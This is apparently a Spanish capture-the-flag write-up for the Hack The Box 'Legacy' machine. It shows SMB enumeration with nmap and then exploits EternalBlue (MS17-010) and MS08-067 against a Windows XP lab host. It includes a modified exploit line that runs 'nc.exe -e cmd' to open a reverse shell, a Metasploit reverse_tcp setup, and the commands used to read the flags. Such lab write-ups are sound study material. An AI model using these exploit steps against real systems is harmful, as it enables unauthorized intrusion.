# Legacy
<table>
  <tr>
    <td style="vertical-align: top; padding-right: 20px;">
      <img src="portadas/Legacy.png" alt="Legacy" style="max-width:320px; width:100%; height:auto;"/>
    </td>
    <td style="vertical-align: top; padding-left: 20px;">
      <strong>Vulnerabilidades / Características a tratar</strong>
      <ul>
        <li>SMB Enumeration</li>
        <li>EternalBlue Exploitation (MS17-010) [Triple Z Exploit]</li>
        <li>Privilege Escalation post-EternalBlue</li>
      </ul>
    </td>
  </tr>
</table>Eternalblue Exploitation (MS17-010) [Triple Z Exploit]


## Reconocimiento inicial
Realizamos un escaneo de todos los puertos para comprobar cuáles estan abiertos y lo exportamos al fichero `allports` 

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.10.4 -oG allports
```

```shell
PORT      STATE    SERVICE      REASON
135/tcp   open     msrpc        syn-ack ttl 127
139/tcp   open     netbios-ssn  syn-ack ttl 127
445/tcp   open     microsoft-ds syn-ack ttl 127

```

Vamos a realizar un escaneo más exaustivo de los siguiente puertos encontrados:


```shell
nmap -sCV -p135,139,445 10.10.11.4 -oN targeted
```
vemos como el sistema que nos enfretamos es un windows antiguo por ello vamos a realizar un escaneo aún más concreto buscando las vuulnerabilidades más básicas de windows antiguos como es Eternal blue.

```shell
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows XP (Windows 2000 LAN Manager)
```
Con el siguiente comando hacemos el escaneo :

```shell
nmap -sV -p 135,139,445 --script "smb-enum-shares,smb-enum-users,smb-os-discovery,smb-vuln-ms08-067,smb-vuln-ms17-010,smb-security-mode" 10.10.10.4
```
vemos que la máquina es vulnerable y de varias maneras , voy a explotarlas las dos:

la primera que nos encontramos es :
```shell
Host script results:
| smb-vuln-ms17-010: 
|   VULNERABLE:
|   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2017-0143
|     Risk factor: HIGH
|       A critical remote code execution vulnerability exists in Microsoft SMBv1
|        servers (ms17-010).
|           
|     Disclosure date: 2017-03-14
```

Y la segunda vulnerabilidad importante que encontramos es :

```shell
smb-vuln-ms08-067: 
|   VULNERABLE:
|   Microsoft Windows system vulnerable to remote code execution (MS08-067)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2008-4250
|           The Server service in Microsoft Windows 2000 SP4, XP SP2 and SP3, Server 2003 SP1 and SP2,
|           Vista Gold and SP1, Server 2008, and 7 Pre-Beta allows remote attackers to execute arbitrary
|           code via a crafted RPC request that triggers the overflow during path canonicalization.
```

## Explotacion CVE-2017-0143

- Qué es: vulnerabilidad de ejecución remota en el servidor SMBv1 de Windows; permite que un atacante envíe paquetes especialmente construidos y ejecute código arbitrario en el equipo objetivo. 

- Sistemas afectados: varias versiones de Windows que soportaban SMBv1 (Windows 7/Server 2008/2012, Windows 8.1, Windows 10, etc.); fue corregida en el boletín MS17-010 publicado el 14 de marzo de 2017. 


- Impacto / contexto histórico: la explotación pública (EternalBlue) filtrada por los Shadow Brokers fue usada por el ransomware WannaCry y otros ataques que causaron infecciones masivas. Esto lo convirtió en un vector crítico de propagación lateral.




Usando el siguiente repositorio:
```shell
https://github.com/worawit/MS17-010
```

Podemos ejecutar el `Eternal blue` para ello modificamos el fichero `zzz_exploit.py` y en ese fichero modificamos la siguiente linea para entablarnos una una shell 

```shell
service_exec (conn,'cmd /c \\10.10.14.9\smbFolder\nc.exe -e cmd 10.10.14.9 443' )
```
Para obtener `nc.exe` se encuentra en el repositorio de las SecList en `/Web-Shells/FuzzDB/nc.ex`

Por otro lado tenemos que compartir el recurso y luego que se sincronice con el directorio actual de trabajo $(pwd)
```shell
smbserver.py smbFolder $(pwd)  
```

Por último por otro lado nos ponemos en escucha por el puerto 443 con `nc` de la siguiente manera para tener una consola interactiva:

```shell
rlwrap nc -nlvp 443
```

Finalmente ejecutamos el código:
```shell
python2 zzz.exploit.py 10.10.10.4 browser
```

Para obtener las flags lo explico en explotando la siguiente vulnerabilidad.


## Explotación CVE-2008-4250

- Vulnerabilidad crítica en el servicio Server de Windows que permitía, mediante un paquete RPC mal formado, provocar un desbordamiento y ejecutar código remoto sin autenticación.

- Afectaba Windows 2000 / XP / Server 2003 (y similares); permitió que gusanos como Conficker se propagaran masivamente.

Para explotarlo de esta manera lo mas fácil es buscar algún exploit existente que nos permita hacerlo, para ellos utilizamos el siguiente comando:

```shell
searchsploit ms08-067
```
y obtenemos los siguientes resultados en lso que existen varios:

```shell
----------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                               |  Path
----------------------------------------------------------------------------- ---------------------------------
Microsoft Windows - 'NetAPI32.dll' Code Execution (Python) (MS08-067)        | windows/remote/40279.py
Microsoft Windows Server - Code Execution (MS08-067)                         | windows/remote/7104.c
Microsoft Windows Server - Code Execution (PoC) (MS08-067)                   | windows/dos/6824.txt
Microsoft Windows Server - Service Relative Path Stack Corruption (MS08-067) | windows/remote/16362.rb
Microsoft Windows Server - Universal Code Execution (MS08-067)               | windows/remote/6841.txt
Microsoft Windows Server 2000/2003 - Code Execution (MS08-067)               | windows/remote/7132.py
```

En mi caso para probar una alternativa más automatizada he usado `metasploit` esta herramienta vamos poder utilizar los exploit más rápido.

- Cargamos metasploit

```shell
msfconsole
```

Buscamos si existe un POC con la vulnerabilidad
```shell
msf > search ms08-067
```
Encontramos que existe uno por lo tanto vamos a configurarlo y usarlo

```shell
use exploit/windows/smb/ms08_067_netapi
```

Para la configuración utilizamos los siguientes comandos 
```shell
set RHOSTS 10.10.10.4
set LHOST Ip
set PAYLOAD windows/meterpreter/reverse_tcp
check
```
Checkeamos que es vulnerable y vamos a poder entablar la revershell

```shell
[+] 10.10.10.4:445 - The target is vulnerable.
```

Ejecutamos el exploit

```shell
run
```

Obtenemos que la shell se ha podido hacer: 
```shell
[*] Started reverse TCP handler on 10.10.14.9:4444 
[*] 10.10.10.4:445 - Automatically detecting the target...
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] 10.10.10.4:445 - Fingerprint: Windows XP - Service Pack 3 - lang:English
[*] 10.10.10.4:445 - Selected Target: Windows XP SP3 English (AlwaysOn NX)
[*] 10.10.10.4:445 - Attempting to trigger the vulnerability...
[*] Sending stage (240 bytes) to 10.10.10.4
[*] Command shell session 1 opened (10.10.14.9:4444 -> 10.10.10.4:1032) at 2025-10-10 04:42:42 -0400
Shell Banner:
Microsoft Windows XP [Version 5.1.2600]
(C) Copyright 1985-2001 Microsoft Corp.

C:\WINDOWS\system32>
```

Buscamos las flags como en el caso anterior con los siguientes comandos.

```shell
dir C:\user.txt /s /b
dir C:\root.txt /s /b
```

```shell
C:\Documents and Settings\john\Desktop\user.txt
C:\Documents and Settings\Administrator\Desktop\root.txt
```
Por último las previsualizamos con el comando `type`

```shell
type "C:\Documents and Settings\john\Desktop\user.txt"
type "C:\Documents and Settings\Administrator\Desktop\root.txt"
```
